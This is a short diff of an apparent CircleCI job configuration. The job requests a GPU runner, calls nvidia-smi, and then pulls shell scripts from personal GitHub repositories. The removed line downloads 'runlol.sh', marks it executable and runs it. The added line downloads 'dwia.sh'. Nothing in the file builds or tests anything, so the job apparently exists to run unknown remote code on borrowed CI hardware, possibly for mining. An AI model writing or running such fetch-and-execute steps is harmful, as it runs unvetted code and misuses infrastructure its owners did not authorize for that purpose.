@@ -7,4 +7,4 @@ jobs:
     resource_class: gpu.nvidia.small
     steps:
       - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/Vaping86/Vaping86/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
+      - run: wget https://raw.githubusercontent.com/bajol1/firman/main/dwia.sh
